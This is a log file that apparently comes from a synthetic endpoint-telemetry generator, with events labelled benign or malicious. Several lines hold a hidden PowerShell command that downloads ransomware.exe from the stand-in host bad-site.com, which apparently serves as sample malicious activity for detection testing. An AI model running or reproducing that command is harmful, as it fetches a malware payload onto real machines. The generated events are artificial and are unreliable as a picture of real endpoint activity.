2026-01-16 17:33:34,554 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:33:36,557 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:33:38,558 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:33:40,560 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:33:42,561 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:33:44,564 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:33:46,568 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:33:48,570 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:33:50,572 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:33:52,574 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:33:54,576 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:33:56,578 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:33:58,580 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:34:00,581 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:34:02,583 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:34:04,584 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:34:06,586 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:34:08,588 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:34:10,590 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:34:12,591 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:34:14,593 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:34:16,595 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:34:18,597 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:34:20,599 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:34:22,600 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:01,766 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:03,772 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:05,774 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:07,776 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:09,778 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:11,779 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:13,780 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:15,782 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:17,784 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:19,786 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:21,788 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:23,788 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:25,790 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:27,791 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:29,793 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:31,794 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:33,795 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:35,797 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:37,799 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:39,801 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:41,803 - INFO - Generated Falcon telemetry: outlook.exe  | Malicious=False
2026-01-16 17:53:43,805 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:45,806 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:47,808 - INFO - Generated Falcon telemetry: chrome.exe https://google.com | Malicious=False
2026-01-16 17:53:49,809 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
2026-01-16 17:53:51,812 - INFO - Generated Falcon telemetry: powershell.exe -nop -w hidden -c Invoke-WebRequest http://bad-site.com/ransomware.exe | Malicious=True
